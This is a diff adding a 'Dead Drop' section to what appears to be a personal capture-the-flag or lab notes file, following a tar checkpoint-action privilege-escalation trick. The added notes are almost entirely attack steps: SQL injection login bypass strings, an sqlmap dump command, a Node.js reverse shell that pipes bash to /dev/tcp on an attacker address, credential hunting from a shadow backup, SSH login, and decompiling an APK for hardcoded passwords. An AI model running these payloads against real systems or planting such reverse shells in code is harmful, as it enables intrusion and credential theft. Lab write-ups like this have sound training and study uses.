@@ -144,5 +144,44 @@ tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh shel
 #                                   --checkpoint-action tells tar to execute shell.sh as root
 ```
 
+# Dead Drop
+```bash
+[Web Server Exploitation]
+export IP=Target_IP
+#### Scanning
+fscan -h $IP -p 1-65535 ALL  ==> 22,80 Open here
+
+#### Web Server
+[SQL Injection Bypass]
+admin'--
+admin' AND 1=1--
+==> [SQL Injection Database Extraction]
+back-end DBMS: SQLite
+Tables:- sqlite_sequence,users
+sqlmap -r req.txt --batch --risk=3 --level=5 --dbs -T users --dump
+
+==> [Credetials Extracted from sql Injection]
+svc-backup:xxxxxx
+admin:xxxxxxx
+
+==> [Reverse shell]
+pwn.js:-
+require('child_process').exec(
+'bash -c "bash -i >& /dev/tcp/192.168.x.x/9001 0>&1"'
+)
+
+==> [Credential Hunting on Web server]
+shadow.bak file found!
+svc-drop:xxxxxxxxxxxx
+
+==> [SSH Login]
+svc-drop:xxxxxxxxxxxx
+
+==> [APK Compilication]
+/home/svc-drop/backup/deaddrop-mobile.apk  --> Compile it using {jadx-gui}
+
+{Global search} :- Control+shift+F ==> Type (username,password)
+Found Creds j.harris:xxxxxxxxxxxxx2026!
+```
 
 > updating...
